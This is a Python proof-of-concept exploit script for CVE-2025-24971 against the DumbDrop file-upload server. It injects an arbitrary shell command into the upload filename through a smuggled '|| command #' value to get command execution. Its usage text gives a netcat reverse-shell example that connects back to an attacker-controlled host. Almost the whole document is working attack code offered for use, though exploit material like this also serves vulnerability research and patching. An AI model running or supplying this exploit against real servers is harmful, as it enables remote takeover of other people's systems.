import requests, sys

if len(sys.argv) != 4:
    print("Usage:\n\tpython CVE-2025-24971.py URL PIN COMMAND")
    print("Reverse shell example:\n\tpython CVE-2025-24971.py http://127.0.0.1:8080 123456 'nc YOUR_SERVER_IP 9001 -e sh'")
    sys.exit()

print("Note: DumbDrop version must be before 4ff8469 commit and APPRISE_URL must be enabled in the server. otherwise it won't work.")

url = sys.argv[1]
pin = sys.argv[2]
command = sys.argv[3]
filename = f'" || {command} #'
file_content = "Hello, World"

upload_init = requests.post(
    url + "/upload/init",
    cookies={
        "DUMBDROP_PIN": pin
    },
    json={
        "filename": filename,
        "fileSize": len(file_content)
    }
)

uploadId = upload_init.json()["uploadId"]

if upload_init.status_code != 200:
    print("Something went wrong: " + upload_init.text)

upload_chunk = requests.post(
    url + "/upload/chunk/" + uploadId,
    cookies={
        "DUMBDROP_PIN": pin
    },
    headers={
        "Content-Type": "application/octet-stream"
    },
    data=file_content
)

if upload_chunk.status_code != 200:
    print("Something went wrong: " + upload_init.text)

print("Done")
